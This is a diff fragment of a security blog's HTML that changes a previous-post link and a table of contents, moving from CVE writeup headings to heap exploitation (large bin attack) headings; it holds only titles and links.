-              <a href="/2021/04/27/CVE-2021-31802%20Netgear%20R7000%20preAuth%20RCE/" rel="prev" title="CVE-2021-31802 NETGEAR R7000 httpd PreAuth RCE">
-                CVE-2021-31802 NETGEAR R7000 httpd PreAuth RCE <i class="fa fa-chevron-right"></i>
+              <a href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B8%83%EF%BC%9ATcache-Attack/" rel="prev" title="堆利用系列七：Tcache Attack ">
+                堆利用系列七：Tcache Attack  <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -804,7 +771,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-ESCAPE-FROM-WWW-ZONE%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">0x00 ESCAPE FROM WWW ZONE漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-NULL-POINTER-FTW%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">0x01 NULL POINTER FTW漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-ONE-KERNEL-TO-RULE-THEM-ALL-%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">0x02 ONE KERNEL TO RULE THEM ALL 漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-A-BUG-OLDER-THAN-4-4BSD-%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">0x03 A BUG OLDER THAN 4.4BSD 漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-THE-RINGTONE-MASSACRE%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">0x04 THE RINGTONE MASSACRE漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E"><span class="nav-number">8.</span> <span class="nav-text">版权声明</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#large-bin-attack%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">large bin attack的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#large-bin-attack-%E4%BE%8B%E7%A8%8B1"><span class="nav-number">2.</span> <span class="nav-text">large bin attack 例程1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#large-bin%E7%9A%84%E5%88%86%E9%85%8D%E5%92%8C%E9%87%8A%E6%94%BE"><span class="nav-number">3.</span> <span class="nav-text">large bin的分配和释放</span></a></li></ol></div>
             
 
           </div>
